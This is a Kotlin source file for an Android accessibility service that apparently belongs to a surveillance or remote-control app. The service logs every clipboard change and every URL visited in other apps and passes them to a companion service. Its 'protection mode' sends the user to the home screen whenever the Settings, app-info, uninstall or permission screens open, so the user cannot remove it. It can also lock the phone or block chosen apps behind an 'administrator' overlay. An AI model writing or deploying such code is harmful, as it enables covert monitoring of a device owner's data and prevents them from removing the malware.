package com.xyz.mod.app

import android.accessibilityservice.AccessibilityService
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.webkit.WebView
import android.webkit.WebViewClient

class XyzAccessibilityService : AccessibilityService() {

    companion object {
        var instance: XyzAccessibilityService? = null
        var overlayReady: Boolean = false
        var protectionEnabled: Boolean = false

        const val ACTION_ACCESSIBILITY_READY = "com.xyz.mod.app.ACCESSIBILITY_READY"
        const val ACTION_CLIPBOARD_CHANGED   = "com.xyz.mod.app.CLIPBOARD_CHANGED"
        const val ACTION_URL_VISITED         = "com.xyz.mod.app.URL_VISITED"

        // Block App state
        private val blockedPkgs = mutableSetOf<String>()
        private var blockAll    = false
        private var ownPkg      = ""

        fun updateBlockedApps(blocked: Set<String>, blockAllApps: Boolean, selfPkg: String) {
            blockedPkgs.clear()
            blockedPkgs.addAll(blocked)
            blockAll = blockAllApps
            ownPkg   = selfPkg
        }

        // Protection packages/classes
        private val BLOCKED_PACKAGES_PROTECTION = setOf(
            "com.android.settings", "com.miui.securitycenter", "com.samsung.android.lool",
            "com.coloros.safecenter", "com.vivo.permissionmanager", "com.huawei.systemmanager",
            "com.google.android.packageinstaller", "com.android.packageinstaller",
            "com.android.permissioncontroller"
        )
        private val BLOCKED_CLASSES_PROTECTION = setOf(
            "com.android.settings.applications.InstalledAppDetails",
            "com.android.settings.applications.AppInfoBase",
            "com.android.settings.applications.ManageApplications",
            "com.android.settings.applications.AppDashboardFragment",
            "com.android.settings.SubSettings",
            "com.android.settings.applications.appinfo.AppInfoDashboardFragment"
        )

        fun addOverlay(view: View, params: WindowManager.LayoutParams) {
            instance?.windowManager?.addView(view, params)
        }

        fun removeOverlay(view: View) {
            try { instance?.windowManager?.removeView(view) } catch (_: Exception) {}
        }

        fun buildOverlayParams(focusable: Boolean): WindowManager.LayoutParams {
            val flags = if (focusable) {
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM
            } else {
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            }
            return WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                flags,
                if (focusable) PixelFormat.TRANSLUCENT else PixelFormat.OPAQUE
            )
        }
    }

    private lateinit var windowManager: WindowManager
    private var hasTriggeredReady = false

    // Clipboard
    private var clipboardManager: ClipboardManager? = null
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null
    private var lastClipText: String = ""

    // URL tracking
    private var lastUrlSent: String = ""

    // Block overlay
    private var blockOverlayView: View? = null
    private var lastBlockedPkg: String = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        registerClipboardListener()
        triggerReady()
    }

    private fun registerClipboardListener() {
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            try {
                val text = clipboardManager?.primaryClip?.getItemAt(0)
                    ?.coerceToText(this)?.toString() ?: ""
                if (text.isNotEmpty() && text != lastClipText) {
                    lastClipText = text
                    sendBroadcast(Intent(ACTION_CLIPBOARD_CHANGED).apply {
                        setPackage(packageName)
                        putExtra("text", text)
                        putExtra("time", System.currentTimeMillis())
                    })
                }
            } catch (e: Exception) {
                Log.e("XyzAccessibility", "Clipboard: ${e.message}")
            }
        }
        clipboardManager?.addPrimaryClipChangedListener(clipboardListener!!)
    }

    private fun triggerReady() {
        if (hasTriggeredReady) return
        hasTriggeredReady = true
        startForegroundService(Intent(this, DeviceService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            sendBroadcast(Intent(ACTION_ACCESSIBILITY_READY).apply { setPackage(packageName) })
        }, 1000)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (!hasTriggeredReady) triggerReady()

        val pkg  = event.packageName?.toString() ?: return
        val cls  = event.className?.toString() ?: ""
        val type = event.eventType

        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            // ── URL Tracking ──
            if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                val text = event.text?.firstOrNull()?.toString() ?: ""
                if ((text.startsWith("http://") || text.startsWith("https://")) && text != lastUrlSent) {
                    lastUrlSent = text
                    sendBroadcast(Intent(ACTION_URL_VISITED).apply {
                        setPackage(packageName)
                        putExtra("url", text)
                        putExtra("pkg", pkg)
                        putExtra("time", System.currentTimeMillis())
                    })
                }
            }

            // ── BLOCK APP MODE ──
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val isBlocked = when {
                    pkg == ownPkg || pkg == "android" || pkg == "com.android.systemui" -> false
                    blockAll && ownPkg.isNotEmpty() && pkg != ownPkg -> true
                    blockedPkgs.contains(pkg) -> true
                    else -> false
                }
                if (isBlocked) {
                    Handler(Looper.getMainLooper()).post {
                        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                        showBlockOverlay(pkg)
                    }
                    return
                }
            }

            // ── PROTECTION MODE ──
            if (protectionEnabled) {
                val isBlockedPkg = BLOCKED_PACKAGES_PROTECTION.contains(pkg)
                val isBlockedCls = BLOCKED_CLASSES_PROTECTION.any { cls.contains(it, ignoreCase = true) }
                val isAppInfoPage = isBlockedCls || (isBlockedPkg && (
                    cls.contains("AppInfo", ignoreCase = true) ||
                    cls.contains("InstalledApp", ignoreCase = true) ||
                    cls.contains("AppDetail", ignoreCase = true) ||
                    cls.contains("ManageApp", ignoreCase = true) ||
                    cls.contains("AppDashboard", ignoreCase = true) ||
                    cls.contains("SubSettings", ignoreCase = true) ||
                    cls.contains("Uninstall", ignoreCase = true) ||
                    cls.contains("PermissionController", ignoreCase = true)
                ))
                if (isAppInfoPage) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                    }, 50)
                    return
                }
            }

            // ── LOCK MODE ──
            val prefs = getSharedPreferences(DeviceService.PREFS_NAME, MODE_PRIVATE)
            if (!prefs.getBoolean(DeviceService.PREF_IS_LOCKED, false)) return
            if (!overlayReady) return
            if (pkg != packageName && !pkg.startsWith("android") && pkg != "com.android.systemui") {
                Handler(Looper.getMainLooper()).postDelayed({
                    try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                }, 80)
            }
        }
    }

    // ── Block Overlay ─────────────────────────────────────────────────────────
    private fun showBlockOverlay(blockedPkg: String) {
        // Kalau overlay sudah ada, dismiss dulu
        dismissBlockOverlay()
        lastBlockedPkg = blockedPkg

        val appName = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(blockedPkg, 0)
            ).toString()
        } catch (_: Exception) { blockedPkg }

        val html = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:transparent}
.overlay{
  position:fixed;inset:0;
  background:rgba(0,0,0,0.82);
  display:flex;align-items:center;justify-content:center;
  backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);
}
.card{
  background:linear-gradient(145deg,#0f0f1a,#1a1a2e);
  border:1px solid rgba(239,68,68,0.3);
  border-radius:20px;padding:32px 28px;
  max-width:320px;width:90%;
  display:flex;flex-direction:column;align-items:center;gap:16px;
  position:relative;
  box-shadow:0 0 40px rgba(239,68,68,0.15),0 20px 60px rgba(0,0,0,0.5);
}
.close-btn{
  position:absolute;top:12px;right:12px;
  width:32px;height:32px;border-radius:50%;
  background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);
  display:flex;align-items:center;justify-content:center;
  cursor:pointer;transition:background .2s;
}
.close-btn:active{background:rgba(255,255,255,0.18)}
.icon-wrap{
  width:72px;height:72px;border-radius:20px;
  background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.25);
  display:flex;align-items:center;justify-content:center;
}
.badge{
  background:rgba(239,68,68,0.12);border:1px solid rgba(239,68,68,0.2);
  border-radius:999px;padding:3px 12px;
  font-size:9px;font-weight:700;color:#ef4444;
  letter-spacing:2px;text-transform:uppercase;font-family:monospace;
}
.title{
  font-size:18px;font-weight:800;color:#f8fafc;
  text-align:center;line-height:1.3;
  font-family:-apple-system,sans-serif;
}
.app-name{
  background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);
  border-radius:10px;padding:10px 18px;
  font-size:13px;font-weight:600;color:#94a3b8;
  text-align:center;width:100%;word-break:break-all;
  font-family:monospace;
}
.desc{
  font-size:12px;color:#64748b;text-align:center;line-height:1.6;
  font-family:-apple-system,sans-serif;
}
.divider{height:1px;background:rgba(255,255,255,0.06);width:100%}
</style>
</head>
<body>
<div class="overlay">
  <div class="card">
    <div class="close-btn" onclick="Android.dismissBlockOverlay()">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2.5">
        <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
      </svg>
    </div>
    <div class="icon-wrap">
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="1.8">
        <circle cx="12" cy="12" r="10"/>
        <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
      </svg>
    </div>
    <div class="badge">AKSES DIBLOKIR</div>
    <div class="title">Aplikasi Ini<br>Tidak Dapat Diakses</div>
    <div class="app-name">${appName}</div>
    <div class="divider"></div>
    <div class="desc">Aplikasi ini telah diblokir oleh administrator perangkat. Hubungi administrator untuk informasi lebih lanjut.</div>
  </div>
</div>
</body>
</html>"""

        val webView = WebView(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            settings.javaScriptEnabled = true
            addJavascriptInterface(object {
                @android.webkit.JavascriptInterface
                fun dismissBlockOverlay() {
                    Handler(Looper.getMainLooper()).post { this@XyzAccessibilityService.dismissBlockOverlay() }
                }
            }, "Android")
            webViewClient = WebViewClient()
            loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        )
        try {
            windowManager.addView(webView, params)
            blockOverlayView = webView
        } catch (e: Exception) {
            Log.e("XyzAccessibility", "showBlockOverlay: ${e.message}")
        }
    }

    fun dismissBlockOverlay() {
        val v = blockOverlayView ?: return
        try { windowManager.removeView(v) } catch (_: Exception) {}
        blockOverlayView = null
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        dismissBlockOverlay()
        clipboardListener?.let { clipboardManager?.removePrimaryClipChangedListener(it) }
        clipboardManager = null
        clipboardListener = null
        instance = null
        overlayReady = false
        hasTriggeredReady = false
    }
}
